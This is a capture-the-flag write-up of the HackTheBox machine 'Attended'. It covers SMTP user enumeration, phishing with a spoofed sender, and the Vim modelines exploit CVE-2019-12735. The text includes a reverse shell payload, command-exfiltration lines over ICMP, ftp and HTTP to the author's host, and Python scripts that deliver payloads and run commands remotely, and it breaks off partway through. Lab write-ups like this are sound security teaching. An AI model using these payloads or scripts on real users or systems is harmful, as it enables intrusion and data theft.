---
title: HTB: Attended
url: https://0xdf.gitlab.io/2021/05/08/htb-attended.html
date: 2021-05-08T13:45:00+00:00
difficulty: Insane [50]
tags: hackthebox, htb-attended, ctf, nmap, smtp, stmp-user-enum, swaks, phishing, vim, cve-2019-12735, vim-modelines, firewall, scripting, python, ssh-config, ssh-keys, ping-sweep, nc-port-scan, openbsd, reverse-engineering, ida, gdb, debug, ssh-keygen, bof, rop, pattern-create, ropper, command-injection, htb-flujab, htb-ypuffy, htb-travel
---

![Attended](https://0xdfimages.gitlab.io/img/attended-cover.png)

Attended was really hard. At the time of writing three days before it retires, just over 100 people have rooted it, making it the least rooted box on HackTheBox. It starts with a phishing exercise where hints betray that the user will open a text file in Vim, opening them to the Vim modelines exploit to get command execution. But there’s a firewall blocking any outbound traffic that isn’t ICMP or a valid HTTP GET request, so I’ll write some scripts to build command and control through that. Then I find a place I can drop an SSH config file that will be run by the second user, which I’ll abuse to get SSH access. For root, there’s a buffer overflow in a command processing SSH auth on the gateway. I’ll craft a malicious SSH key to overflow that binary and get a reverse shell. In Beyond Root, I’ll look at an unintended command injection in the SSH config running script.

## Box Info

| Name | [Attended](https://hackthebox.com/machines/attended)  [Attended](https://hackthebox.com/machines/attended) [Play on HackTheBox](https://hackthebox.com/machines/attended) |
| --- | --- |
| Release Date | [19 Dec 2020](https://twitter.com/hackthebox_eu/status/1339556151734759424) |
| Retire Date | 08 May 2021 |
| OS | OpenBSD OpenBSD |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Attended |
| Radar Graph | Radar chart for Attended |
| First Blood User | 14:33:48[jkr jkr](https://app.hackthebox.com/users/77141) |
| First Blood Root | 1 day03:10:40[jkr jkr](https://app.hackthebox.com/users/77141) |
| Creators | [guly guly](https://app.hackthebox.com/users/8292)  [freshness freshness](https://app.hackthebox.com/users/46502) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and SMTP (25):

```

oxdf@parrot$ sudo nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.221
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-29 12:08 EDT
Nmap scan report for 10.10.10.221
Host is up (0.026s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp

Nmap done: 1 IP address (1 host up) scanned in 13.44 seconds
oxdf@parrot$ sudo nmap -p 22,25 -sCV -oA scans/nmap-tcpscripts 10.10.10.221
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-29 12:10 EDT
Nmap scan report for 10.10.10.221
Host is up (0.018s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 4f:08:48:10:a2:89:3b:bd:4a:c6:81:03:cb:20:04:f5 (RSA)
|   256 1a:41:82:21:9f:07:9d:cd:61:97:e7:fe:96:3a:8f:b0 (ECDSA)
|_  256 e0:6e:3d:52:ca:5a:7b:4a:11:cb:94:ef:af:49:07:aa (ED25519)
25/tcp open  smtp
| fingerprint-strings: 
|   GenericLines, GetRequest: 
|     220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
|     5.5.1 Invalid command: Pipelining not supported
|   Hello: 
|     220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
|     5.5.1 Invalid command: EHLO requires domain name
|   Help: 
|     220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
|     214- This is OpenSMTPD
|     214- To report bugs in the implementation, please contact bugs@openbsd.org
|     214- with full details
|     2.0.0: End of HELP info
|   NULL: 
|_    220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
| smtp-commands: proudly setup by guly for attended.htb Hello nmap.scanme.org [10.10.14.14], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, 
|_ This is OpenSMTPD To report bugs in the implementation, please contact bugs@openbsd.org with full details 2.0.0: End of HELP info 
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.91%I=7%D=4/29%Time=608ADA70%P=x86_64-pc-linux-gnu%r(NULL
SF:,3C,"220\x20proudly\x20setup\x20by\x20guly\x20for\x20attended\.htb\x20E
SF:SMTP\x20OpenSMTPD\r\n")%r(Hello,72,"220\x20proudly\x20setup\x20by\x20gu
SF:ly\x20for\x20attended\.htb\x20ESMTP\x20OpenSMTPD\r\n501\x205\.5\.1\x20I
SF:nvalid\x20command:\x20EHLO\x20requires\x20domain\x20name\r\n")%r(Help,D
SF:5,"220\x20proudly\x20setup\x20by\x20guly\x20for\x20attended\.htb\x20ESM
SF:TP\x20OpenSMTPD\r\n214-\x20This\x20is\x20OpenSMTPD\r\n214-\x20To\x20rep
SF:ort\x20bugs\x20in\x20the\x20implementation,\x20please\x20contact\x20bug
SF:s@openbsd\.org\r\n214-\x20with\x20full\x20details\r\n214\x202\.0\.0:\x2
SF:0End\x20of\x20HELP\x20info\r\n")%r(GenericLines,71,"220\x20proudly\x20s
SF:etup\x20by\x20guly\x20for\x20attended\.htb\x20ESMTP\x20OpenSMTPD\r\n500
SF:\x205\.5\.1\x20Invalid\x20command:\x20Pipelining\x20not\x20supported\r\
SF:n")%r(GetRequest,71,"220\x20proudly\x20setup\x20by\x20guly\x20for\x20at
SF:tended\.htb\x20ESMTP\x20OpenSMTPD\r\n500\x205\.5\.1\x20Invalid\x20comma
SF:nd:\x20Pipelining\x20not\x20supported\r\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.49 seconds

```

OpenSMTPD is associated with OpenBSD, which matches what HTB says this machine is.

### SMTP - TCP 25

#### Username Enum

`nmap` showed a connection string, but it’s easier to see with `telnet`:

```

oxdf@parrot$ telnet 10.10.10.221 25
Trying 10.10.10.221...
Connected to 10.10.10.221.
Escape character is '^]'.
220 proudly setup by guly for attended.htb ESMTP OpenSMTPD

```

I’ll note both the username guly and the domain attended.htb.

I’ll give it a `EHLO` message to start the session:

```

EHLO 0xdf
250-proudly setup by guly for attended.htb Hello 0xdf [10.10.14.14], pleased to meet you
250-8BITMIME
250-ENHANCEDSTATUSCODES
250-SIZE 36700160
250-DSN
250 HELP

```

The `HELP` command isn’t useful:

```

HELP
214- This is OpenSMTPD
214- To report bugs in the implementation, please contact bugs@openbsd.org
214- with full details
214 2.0.0: End of HELP info

```

`VRFY` doesn’t seem to work:

```

VRFY root
500 5.5.1 Invalid command: Command unrecognized

```

I can check for valid accounts using `RCPT TO` commands:

```

oxdf@parrot$ telnet 10.10.10.221 25
Trying 10.10.10.221...
Connected to 10.10.10.221.
Escape character is '^]'.
220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
HELO 0xdf
250 proudly setup by guly for attended.htb Hello 0xdf [10.10.14.14], pleased to meet you
MAIL FROM: <0xdf@attended.htb>
250 2.0.0: Ok
RCPT TO: <guly@attended.htb>
250 2.1.5 Destination address valid: Recipient ok
RCPT TO: <0xdf@attended.htb>
550 Invalid recipient: <0xdf@attended.htb>

```

The other box creator also has an account on the box:

```

RCPT TO: <freshness@attended.htb>
250 2.1.5 Destination address valid: Recipient ok

```

I played around with brute forcing other names with `smtp-user-enum` in a `bash` loop. root also exists:

```

oxdf@parrot$ cat /usr/share/seclists/Usernames/top-usernames-shortlist.txt | while read username; do smtp-user-enum -f '<0xdf@attended.htb>' -u "<${username}@attended.htb>" -M RCPT -t 10.10.10.221; done | grep exists
10.10.10.221: <root@attended.htb> exists

```

I didn’t find much else.

#### Send Email

At this point I started sending emails to the accounts I had, starting with guly, since it was the first to show up. I’ll try sending him an email using `swaks`, and listening for a reply with `python`’s SMTP server (I did something similar in [FluJab](/2019/06/15/htb-flujab.html), but this time I’ll just run the module from the command line rather than in a script).

It took a few tries to get an email to send. Sending to `guly`, `guly@10.10.10.221`, `guly@localhost` or `guly@127.0.0.1` returned error messages. Using the domain from the smtp message worked:

```

oxdf@parrot$ swaks --to guly@attended.htb --from 0xdf@10.10.14.14 --header "Subject: Hello?" --body "Are you there?" --server 10.10.10.221
=== Trying 10.10.10.221:25...
=== Connected to 10.10.10.221.
<-  220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
 -> EHLO parrot
<-  250-proudly setup by guly for attended.htb Hello parrot [10.10.14.14], pleased to meet you
<-  250-8BITMIME
<-  250-ENHANCEDSTATUSCODES
<-  250-SIZE 36700160
<-  250-DSN
<-  250 HELP
 -> MAIL FROM:<0xdf@10.10.14.14>
<-  250 2.0.0: Ok
 -> RCPT TO:<guly@attended.htb>
<-  250 2.1.5 Destination address valid: Recipient ok
 -> DATA
<-  354 Enter mail, end with "." on a line by itself
 -> Date: Fri, 30 Apr 2021 15:00:06 -0400
 -> To: guly@attended.htb
 -> From: 0xdf@10.10.14.14
 -> Subject: Hello?
 -> Message-Id: <20210430150006.004756@parrot>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 -> 
 -> Are you there?
 -> 
 -> 
 -> .
<-  250 2.0.0: 7f159c80 Message accepted for delivery
 -> QUIT
<-  221 2.0.0: Bye
=== Connection closed with remote host.

```

A minute later an email arrives that looks like an out of office response:

```

oxdf@parrot$ python -m smtpd -n -c DebuggingServer 10.10.14.14:25
---------- MESSAGE FOLLOWS ----------        
b'Received: from attended.htb (attended.htb [192.168.23.2])'
b'\tby attendedgw.htb (Postfix) with ESMTP id 434CD32DD6'
b'\tfor <0xdf@10.10.14.14>; Fri, 30 Apr 2021 20:57:41 +0200 (CEST)'
b'Content-Type: multipart/alternative;'
b' boundary="===============7263872367454596040=="'
b'MIME-Version: 1.0'                         
b'Subject: Re: Hello?'
b'From: guly@attended.htb'           
b'X-Peer: 10.10.10.221'
b''
b'--===============7263872367454596040=='
b'Content-Type: text/plain; charset="us-ascii"'
b'MIME-Version: 1.0'
b'Content-Transfer-Encoding: 7bit'
b''                   
b'hello, thanks for writing.'     
b"i'm currently quite busy working on an issue with freshness and dodging any email from everyone but him. i'll get back in touch as soon as possible."
b''                          
b''
b'---'
b'guly'             
b''                               
b'OpenBSD user since 1995'
b'Vim power user'            
b''
b'/"\\ '         
b'\\ /  ASCII Ribbon Campaign'
b' X   against HTML e-mail'
b'/ \\  against proprietary e-mail attachments'
b''                        
b'--===============7263872367454596040==--'
------------ END MESSAGE ------------

```

There’s a ton of hints in here:
- guly is dodging emails from everyone but freshness (the other box author)
- “Vim power user” suggests to look at `vim`
- “Against HTML e-mail” and “against proprietary e-mail attachments” suggests not to send a word doc or HTML links

#### Send From freshness

I tried sending an email from freshness:

```

oxdf@parrot$ swaks --to guly@attended.htb --from freshness@attended.htb --header "Subject: Hello?" --body "Are you there?" --server 10.10.10.221
=== Trying 10.10.10.221:25...
=== Connected to 10.10.10.221.
<-  220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
 -> EHLO parrot
<-  250-proudly setup by guly for attended.htb Hello parrot [10.10.14.14], pleased to meet you
<-  250-8BITMIME
<-  250-ENHANCEDSTATUSCODES
<-  250-SIZE 36700160
<-  250-DSN
<-  250 HELP
 -> MAIL FROM:<freshness@attended.htb>
<-  250 2.0.0: Ok
 -> RCPT TO:<guly@attended.htb>
<-  250 2.1.5 Destination address valid: Recipient ok
 -> DATA
<-  354 Enter mail, end with "." on a line by itself
 -> Date: Fri, 30 Apr 2021 15:04:47 -0400
 -> To: guly@attended.htb
 -> From: freshness@attended.htb
 -> Subject: Hello?
 -> Message-Id: <20210430150447.005020@parrot>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 -> 
 -> Are you there?
 -> 
 -> 
 -> .
<-  250 2.0.0: ec19de6b Message accepted for delivery
 -> QUIT
<-  221 2.0.0: Bye
=== Connection closed with remote host.

```

Interestingly, I got an email back at my SMTP server:

```
---------- MESSAGE FOLLOWS ----------
b'Received: from attended.htb (attended.htb [192.168.23.2])'
b'\tby attendedgw.htb (Postfix) with ESMTP id 50B0732CCF'
b'\tfor <freshness@10.10.14.14>; Fri, 30 Apr 2021 21:08:40 +0200 (CEST)'
b'Content-Type: multipart/alternative;'
b' boundary="===============7051182491795655552=="'
b'MIME-Version: 1.0'
b'Subject: Re: Hello?'
b'From: guly@attended.htb'
b'X-Peer: 10.10.10.221'
b''
b'--===============7051182491795655552=='
b'Content-Type: text/plain; charset="us-ascii"'
b'MIME-Version: 1.0'
b'Content-Transfer-Encoding: 7bit'
b''
b'hi mate, could you please double check your attachment? looks like you forgot to actually attach anything :)'
b''
b'p.s.: i also installed a basic py2 env on gw so you can PoC quickly my new outbound traffic restrictions. i think it should stop any non RFC compliant connection.'
b''
b''
b'---'
b'guly'
b''
b'OpenBSD user since 1995'
b'Vim power user'
b''
b'/"\\ '
b'\\ /  ASCII Ribbon Campaign'
b' X   against HTML e-mail'
b'/ \\  against proprietary e-mail attachments'
b''
b'--===============7051182491795655552==--'
------------ END MESSAGE ------------

```

The address seems to have been re-written from freshness@attended.htb to freshness@10.10.14.14. This is a pretty unrealistic automation (I don’t really see how it would have happened in the real world… maybe if I had added myself as a CC, and then gotten a reply all?), but, I stumbled into it. So I’ll proceed. Sometimes in CTFs (and probably in real life as well) you just have to try some stuff.

guly is asking for an attachment, and the PS gives hints about a legacy Python environment on the gateway, and traffic restrictions.

#### Send Attachment from freshness

If I attach a Word doc to the same send line below (`swaks --to guly@attended.htb --from freshness@attended.htb --header "Subject: file you asked for?" --body "Here you go" --server 10.10.10.221 --attach @s.doc`), the response reminds me of guly’s dislike of MS Office:

> hi mate, i’m sorry but i can’t read your attachment. could you please remember i’m against proprietary e-mail attachments? :)

If instead I send a .txt file, guly replies:

> thanks dude, i’m currently out of the office but will SSH into the box immediately and open your attachment with vim to verify its syntax.
> if everything is fine, you will find your config file within a few minutes in the /home/shared folder.
> test it ASAP and let me know if you still face that weird issue.

A hint for later - freshness will be “testing his config file”.

## RCE as guly

### Vim CVE

The email explicitly says that guly will open the attachment in `vim`. There’s an arbitrary code execution exploit in `vim`, CVE-2019-12735 that involves attack the `modelines` feature. A proof of concept was published [on GitHub](https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md).

The first POC on that repo looks like this:

```

:!uname -a||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="

```

That runs `uname -a`. There’s another for a reverse shell using `nc`:

```

\x1b[?7l\x1bSNothing here.\x1b:silent! w | call system(\'nohup nc 127.0.0.1 9999 -e /bin/sh &\') | redraw! | file | silent! # " vim: set fen fdm=expr fde=assert_fails(\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\') fdl=0: \x16\x1b[1G\x16\x1b[KNothing here."\x16\x1b[D \n

```

### Ping POC

To test, I downloaded the simple POC and replaced `uname -a` with a `ping`:

```

oxdf@parrot$ cat poc.txt 
:!ping -c 1 10.10.14.14||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="

```

I started `tcpdump`, and then sent that as an attachment (`swaks --to guly@attended.htb --from freshness@attended.htb --header "Subject: file you asked for?" --body "Here you go" --server 10.10.10.221 --attach @poc.txt`), and a minute later, first the same note about opening it in `vim`, and then a few seconds later, ICMP packets are `tcpdump`:

```

oxdf@parrot$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
16:44:47.322017 IP 10.10.10.221 > 10.10.14.14: ICMP echo request, id 16027, seq 0, length 64
16:44:47.322086 IP 10.10.14.14 > 10.10.10.221: ICMP echo reply, id 16027, seq 0, length 64

```

That’s successful remote code execution.

### Connection Fails

From here, I wanted to use that to get a shell. I tried a lot of things that didn’t work:
- Multiple reverse shells, including the on in the POC as well as the standard batch on many different ports
- `curl` and `wget` did not get requests back to my host
- I tried a bunch of ways to encode data into `ping` packets. While probably possible, I couldn’t get the syntax working
- `dig` to do DNS queries at my host
- a loop over all ports trying to connect with `nc` back to my host

### Connection

#### Strategy

The line from guly’s note to freshness is important:

> i also installed a basic py2 env on gw so you can PoC quickly my new outbound traffic restrictions. i think it should stop any non RFC compliant connection

My best guess is that “new outbound traffic restrictions” explains why a reverse shell won’t connect back. From a lot of testing, it seems like only ICMP and valid HTTP (on TCP 80 and 8080) are allowed out through the gateway. As far as I know, there are three ways to get a connection back and exfil data:
- icmp
- HTTP using `ftp`
- HTTP using Python2 / `requests`

#### ICMP

I already know that ICMP gets out from my POC. I can use the `-p` option to put command output there (hex encoded). For example, with an attachment like this:

```

:!ping -c 1 -p `id | xxd -p | head -1` 10.10.14.14||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="  

```

That will execute `ping`, and `-p` sets the payload to the output of what’s in the backticks. In this case, it’s the `id` command, which I’ll have to then hex encode with `xxd -p` so that it can go into the `ping`. The challenge is that only the first 16 bytes will come back:

```

14:00:46.211914 IP 10.10.14.14 > 10.10.10.221: ICMP echo reply, id 13054, seq 0, length 64
        0x0000:  4500 0054 a806 0000 4001 a5a4 0a0a 0e0e  E..T....@.......
        0x0010:  0a0a 0add 0000 62d8 32fe 0000 79bc 5a3c  ......b.2...y.Z<
        0x0020:  cec3 00d5 dbf0 e0b5 2efe 2e2d c479 58a9  ...........-.yX.
        0x0030:  8788 2343 7569 643d 3130 3030 2867 756c  ..#Cuid=1000(gul
        0x0040:  7929 2067 7569 643d 3130 3030 2867 756c  y).guid=1000(gul
        0x0050:  7929 2067                                y).g

```

The result of `id` is started there (three times), `uid=1000(guly) g`. I could use Python2 to run commands, collect data, and then loop over the results to send them back over ICMP.

#### ftp

`ftp` on BSD does something I wasn’t aware of, in that if I run `ftp http://10.10.14.14/test` it will get the file similar to `wget`. A payload like this will return the output of `id` to a web server on my hosts:

```

:!ftp http://10.10.14.14/`id | xxd -p | tr -d '\n'`|" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="

```

I used `xxd` as `base64` doesn’t seem to be on the box (it turns out that piping into `openssl base64` will work).

```

oxdf@parrot$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.221 - - [02/May/2021 14:11:47] code 404, message File not found
10.10.10.221 - - [02/May/2021 14:11:47] "GET /7569643d313030302867756c7929206769643d313030302867756c79292067726f7570733d313030302867756c79290a HTTP/1.0" 404 -

```

That url decodes:

```

oxdf@parrot$ echo "7569643d313030302867756c7929206769643d313030302867756c79292067726f7570733d313030302867756c79290a" | xxd -r -p
uid=1000(guly) gid=1000(guly) groups=1000(guly)

```

I could also use this method to upload files to Attended with a few more args to the `ftp` binary.

#### requests

The first of these I found was `requests`, and so that is what I’ll show for the remainder of this post. The payload looks like this:

```

:!python2 -c "import requests, os, base64; res = base64.b64encode(os.popen('id').read()); requests.get('http://10.10.14.14/' + res)"|" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="

```

It uses `os.popen` to run a command and get the output, then base64-encodes it and sends it back over HTTP using `requests`:

```

oxdf@parrot$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.221 - - [02/May/2021 14:20:47] code 404, message File not found
10.10.10.221 - - [02/May/2021 14:20:47] "GET /dWlkPTEwMDAoZ3VseSkgZ2lkPTEwMDAoZ3VseSkgZ3JvdXBzPTEwMDAoZ3VseSkK HTTP/1.1" 404 -

```

Decoding the result provides the expected output:

```

oxdf@parrot$ echo "dWlkPTEwMDAoZ3VseSkgZ2lkPTEwMDAoZ3VseSkgZ3JvdXBzPTEwMDAoZ3VseSkK" | base64 -d
uid=1000(guly) gid=1000(guly) groups=1000(guly)

```

### Automation

In trying all this, I have a pretty good feel that the automation that is running `vim` is running every minute. It’s going to be really slow until I get to a better shell. Still, I want to automate this so that I can run commands more easily without having to edit a text file each time.

#### runcmd.py

My first attempt was to create a Python script that would generate the payload, then create an email and attach the payload, and send it, and then handle the response:

```

#!/usr/bin/env python3

import base64
import smtplib
import socket
import sys
from datetime import datetime
from email.message import EmailMessage

command = sys.argv[1]
payload = f''':!python2 -c "import requests, os, base64; path = '/'; res = os.popen('{command}').read(); f = base64.b64encode(res); requests.get('http://10.10.14.14/' + f)"|" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="'''

msg = EmailMessage()
msg["From"] = 'freshness@attended.htb'
msg["To"] = 'guly@attended.htb'
msg["Subject"] = 'file you asked for?'
msg.set_content = 'Here you go'
msg.add_attachment(payload, filename="poc.txt")

s = smtplib.SMTP('10.10.10.221', 25)
s.send_message(msg)
print(f'[+] Email sent at {datetime.now()}. Listening on 80 for RCE response.')

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', 80))
    s.listen()
    conn, addr = s.accept()
    with conn:
        print(f'[+] Connection from {addr[0]} at {datetime.now()}')
        data = conn.recv(8096)
        b64 = data.split(b' ')[1][1:]
        print(base64.b64decode(b64).decode(errors='ignore'))

```

The command to run is taken from the command line, and used to build the payload. Then the email is created and the payload attached. It sends the email, and prints the time. Then it starts a raw socket on 80 waiting to get the response, which it reads, breaks apart to get the base64-data, decodes, and prints.

It works:

```

oxdf@parrot$ python run-cmd.py id
[+] Email sent at 2021-05-02 14:44:56.277673. Listening on 80 for RCE response.
[+] Connection from 10.10.10.221 at 2021-05-02 14:45:47.540672
uid=1000(guly) gid=1000(guly) groups=1000(guly)

```

One thing I noticed was that longer results just didn’t connect back at all. There’s a maximum URL length around 2000 characters. Base64 inflates the results by an extra 33%, so I found that adding `os.popen('{command}').read()[:1500]` made it so that it would always return, but still, some output was truncated.

I had tried to just send results out as POST requests, but it seems like only GET requests make it out.

#### upload.py

For a more complete approach, I’m going to upload a script to Attended that I can call, and it will manage sending back data in multiple requests. `upload.py` which will generate a `vim` exploit that uses `requests` to GET a file from my VM (served from the current directory).

```

#!/usr/bin/env python3

import http.server
import smtplib
import socketserver
import sys
from datetime import datetime
from email.message import EmailMessage

upload_file = sys.argv[1]
path = sys.argv[2]
payload = f''':!python2 -c "import requests; resp = requests.get('http://10.10.14.14/{upload_file}', stream=True); fd = open('{path}', 'wb'); fd.write(resp.content); fd.close()"|" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="'''

msg = EmailMessage()
msg["From"] = 'freshness@attended.htb'
msg["To"] = 'guly@attended.htb'
msg["Subject"] = 'file you asked for?'
msg.set_content = 'Here you go'
msg.add_attachment(payload, filename="poc.txt")

s = smtplib.SMTP('10.10.10.221', 25)
s.send_message(msg)
print(f'[+] Email sent at {datetime.now()}')

handler = http.server.SimpleHTTPRequestHandler
with socketserver.TCPServer(("", 80), handler) as httpd:
    print("[+] Waiting for HTTP request")
    httpd.handle_request()

```

The `payload` is just calling requests, reading the response, and writing it to a file. Then it uses `smtplib` and `email.message` to create an email, attach the attachment, and send the email. Finally, it starts an HTTP server to handle the next request to my VM served from the current directory. Running it looks like:

```

oxdf@parrot$ python upload.py cmdrunner.py /tmp/cmdrunner.py
[+] Email sent at 2021-05-02 14:37:24.758346
[+] Waiting for HTTP request
10.10.10.221 - - [02/May/2021 14:37:48] "GET /cmdrunner.py HTTP/1.1" 200 -

```

#### cmdrunner.py

The script I’m going to upload isn’t complicated. It needs to run the take an argument from the command line, run it, break the results into 1500 byte blocks, loop over the blocks, base64encoding and sending a HTTP GET.

```

#!/usr/bin/python2

import base64
import os
import requests
import sys
import time

cmd = sys.argv[1]
res = os.popen(cmd).read()

chunk_size = 1500
for i in range(0, len(res), chunk_size):
    requests.get('http://10.10.14.14/' + base64.b64encode(res[i:i+chunk_size]))
    time.sleep(0.5)

requests.get('http://10.10.14.14/done')

```

I found that adding a sleep prevented the host from overwhelming the server, and most of the time didn’t add too much time. When the file is done, I’ll send a request to `/done` so the server knows it has the full file.

#### cmdrunner-server.py

I think if I were doing this again, I’d break this script into two - one to send commands, and one to handle responses. Or, I would go with a more complicated agent running on attended (see next section). But I did this in one script the send a command, and wait for a response.

This script will send the `vim` payload, and then start a socket server to handle responses until it gets a request to `/done`, and then it will print the result. I made an effort to have status messages print tp STDOUT so that I could redirect the file itself to a file and not get them.

```

#!/usr/bin/env python3

import base64
import smtplib
import socket
import sys
from datetime import datetime
from email.message import EmailMessage

command = sys.argv[1]
payload = f''':!python2 /tmp/cmdrunner.py '{command}'|" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="'''

msg = EmailMessage()
msg["From"] = 'freshness@attended.htb'
msg["To"] = 'guly@attended.htb'
msg["Subject"] = 'file you asked for?'
msg.set_content = 'Here you go'
msg.add_attachment(payload, filename="poc.txt")

s = smtplib.SMTP('10.10.10.221', 25)
s.send_message(msg)
sys.stderr.write(f'[+] Email sent at {datetime.now()}. Listening on 80 for RCE response.\n')

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', 80))
    s.listen(100)
    exfil = b''
    i = 0
    while True:
        conn, addr = s.accept()
        sys.stderr.write(f'\r[+] Connection revieved at {datetime.now()}: {i}')
        i += 1
        with conn:
            data = conn.recv(8096)
            conn.send(b'HTTP/1.0 200 OK\n\n')
            b64 = data.split(b' ')[1][1:]
            if b64 == b'done':
                break
            exfil += base64.b64decode(b64)
    sys.stderr.write('\n')
    sys.stdout.buffer.write(exfil)   

```

It works:

```

oxdf@parrot$ python cmdrunner-server.py 'id'
[+] Email sent at 2021-05-02 14:52:24.956680. Listening on 80 for RCE response.
[+] Connection revieved at 2021-05-02 14:52:48.826567: 1
uid=1000(guly) gid=1000(guly) groups=1000(guly)

```

It also handles longer outputs. For example, `ls -l /etc` takes three requests to get the full results:

```

oxdf@parrot$ python cmdrunner-server.py 'ls -l /etc'
[+] Email sent at 2021-05-02 14:55:15.965318. Listening on 80 for RCE response.
[+] Connection revieved at 2021-05-02 14:55:52.946185: 3
total 2972                                           
drwx------  2 root  wheel        512 Apr 13  2019 acme    
-rw-r--r--  1 root  wheel       1764 Jun 26  2019 adduser.conf
drwxr-xr-x  2 root  wheel        512 Apr 13  2019 amd    
drwxr-xr-x  2 root  wheel        512 Apr 13  2019 authpf
-rw-r--r--  1 root  wheel         14 Jul  1  2019 boot.conf
...[snip]...

```

#### Further Work

The next step would be to update the client on Attended to run an infinite loop, checking back with GET requests for commands, and if there was a new command, running it and sending back the results. I was able to find what I needed with the solution above, but that would be much more user friendly to work with, and how real malware typically operates.

## Shell as freshness

### Enumeration

#### ssh config

The current directory is `/home/guly`:

```

oxdf@parrot$ python cmdrunner-server.py 'pwd'
[+] Email sent at 2021-05-02 15:02:02.733200. Listening on 80 for RCE response.
[+] Connection revieved at 2021-05-02 15:02:48.871755: 1
/home/guly

```

Listing that dir shows a couple things:

```

oxdf@parrot$ python cmdrunner-server.py 'ls -la'
[+] Email sent at 2021-05-02 15:03:11.149080. Listening on 80 for RCE response.
[+] Connection revieved at 2021-05-02 15:03:51.757321: 1
total 60
drwxr-x---  4 guly  guly    512 May  2 21:06 .
drwxr-xr-x  5 root  wheel   512 Jun 26  2019 ..
-rw-r--r--  1 guly  guly     87 Apr 13  2019 .Xdefaults
-rw-r--r--  1 guly  guly    771 Apr 13  2019 .cshrc
-rw-r--r--  1 guly  guly    101 Apr 13  2019 .cvsrc
-rw-r--r--  1 guly  guly    359 Apr 13  2019 .login
-rw-r--r--  1 guly  guly    175 Apr 13  2019 .mailrc
-rw-r--r--  1 guly  guly    215 Apr 13  2019 .profile
drwx------  2 root  wheel   512 Jun 26  2019 .ssh
-rw-------  1 guly  guly      0 Dec 15 17:05 .viminfo
-rw-r-----  1 guly  guly     13 Jun 26  2019 .vimrc
-rwxrwxrwx  1 root  guly   6789 Dec  4 09:07 gchecker.py
-rw-------  1 guly  guly      0 May  2 21:06 mbox
drwxr-xr-x  2 guly  guly    512 Jun 26  2019 tmp

```

`.ssh` is not writable, so I can’t get a shell that way. There is a `tmp` directory. It contains a single file:

```

oxdf@parrot$ python cmdrunner-server.py 'ls -la tmp'
[+] Email sent at 2021-05-02 15:04:36.877825. Listening on 80 for RCE response.
[+] Connection revieved at 2021-05-02 15:04:52.525414: 1
total 32
drwxr-xr-x  2 guly  guly    512 Jun 26  2019 .
drwxr-x---  4 guly  guly    512 May  2 21:07 ..
-rwxr-x---  1 guly  guly  12288 Jun 26  2019 .config.swp

```

I had a hard time getting the file with a hash match on the file on Attended, but the strings in the file were close enough to suggest what the file was:

```

oxdf@parrot$ strings .config.swp 
b0VIM 8.1
guly
attended.htb
~guly/tmp/.ssh/config
U3210
#"! 
  ServerAliveInterval 60
  TCPKeepAlive yes
  ControlPersist 4h
  ControlPath /tmp/%r@%h:%p
  ControlMaster auto
  User freshness
Host *

```

The user was editing an SSH config file.

#### shared

There was the line in guly’s note to freshness:

> if everything is fine, you will find your config file within a few minutes in the /home/shared folder.
> test it ASAP and let me know if you still face that weird issue.

It’s a hint that if I drop a config file into `/home/shared`, it will be “tested” by freshness.

The `/home/shared` directory does exist, and guly can write to it but not read from it:

```

oxdf@parrot$ python cmdrunner-server.py 'ls -la /home/'
[+] Email sent at 2021-05-02 15:54:51.267228. Listening on 80 for RCE response.
[+] Connection revieved at 2021-05-02 15:55:47.693708: 1
total 20
drwxr-xr-x   5 root       wheel      512 Jun 26  2019 .
drwxr-xr-x  13 root       wheel      512 May  1 20:58 ..
drwxr-x---   4 freshness  freshness  512 Nov 12 16:56 freshness
drwxr-x---   4 guly       guly       512 May  2 21:58 guly
drwxrwx-wx   2 root       freshness  512 May  2 21:46 shared

```

### Exploit

#### Strategy

